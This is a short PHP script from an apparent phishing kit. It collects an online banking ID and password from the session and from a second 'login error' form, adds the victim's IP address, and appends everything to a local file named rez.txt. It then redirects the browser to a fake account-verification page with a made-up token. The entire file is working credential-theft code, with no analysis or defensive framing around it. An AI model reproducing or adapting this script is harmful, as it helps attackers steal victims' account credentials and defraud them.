<?php
ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$_SESSION['userror'] = $_POST['userror'];
$_SESSION['passerror'] = $_POST['passerror'];


$zabi = getenv("REMOTE_ADDR");
$message .= "--------------  LOGIN  -------------\n";
$message .= "Onlineid : ".$_SESSION['USER']."\n";
$message .= "Password : ".$_SESSION['PASSWORD']."\n";
$message .= "--------------  LOGIN Error  -------------\n";
$message .= "Onlineid : ".$_POST['userror']."\n";
$message .= "Password : ".$_POST['passerror']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";


$file = fopen("rez.txt", 'a');
fwrite($file, $message);

$Logon="de.html?cmd=_account-details&verify=$host";
header("location: $Logon");
?>
